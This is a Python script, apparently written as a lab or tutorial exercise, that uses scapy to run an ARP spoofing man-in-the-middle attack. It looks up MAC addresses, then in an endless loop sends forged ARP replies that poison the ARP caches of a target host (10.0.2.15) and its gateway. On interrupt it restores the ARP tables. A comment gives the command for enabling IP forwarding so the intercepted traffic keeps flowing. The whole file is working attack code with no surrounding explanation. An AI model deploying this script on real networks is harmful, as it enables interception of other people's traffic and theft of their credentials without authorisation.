#! arp_spoofing

import scapy.all as scapy
import time
import sys

#List all fields in ARP packet
#print(scapy.ls(scapy.ARP()))

#Fetch MAC address using IP address - ARP
def get_MAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#Function that perform ARP spoofing by sending an ARP response packet to target
def spoof(ip_target, ip_spoof):
    #Preparing a ARP response packet
    #op=2 implies for an ARP Response packet, pdst = IP address of target, hwdst = MAC address of target, psrc = IP Address of source (attacker machine)
    response_packet = scapy.ARP(op=2, pdst=ip_target, hwdst=get_MAC(ip_target), psrc=ip_spoof)
    scapy.send(response_packet, verbose=False) #Function to send packet

#Restore function once ARP Spoofing is terminated
def restore(destination_ip, source_ip):
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_MAC(destination_ip), psrc=source_ip, hwsrc=get_MAC(source_ip))
    print(restore_packet.show())
    scapy.send(restore_packet, count=4, verbose=False)

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    packet_sent_counter = 0
    while True: #Continuously sending ARP spoofing to retain MitM attack
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        packet_sent_counter += 2
        print("\r[+] Packets sent: "+str(packet_sent_counter)), #',' will buffer output
        sys.stdout.flush() #Print buffer of print statement
        time.sleep(2)

        #For python3, flush() doesnot work
        #print("\r[+] Packets sent: " + str(packet_sent_counter), end="")
        #time.sleep(2)

except KeyboardInterrupt:
    print("\nARP Spoofing interrupted! Resetting ARP table and quiting....")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

#Command to forward packet
#echo 1 > /proc/sys/net/ipv4/ip_forward
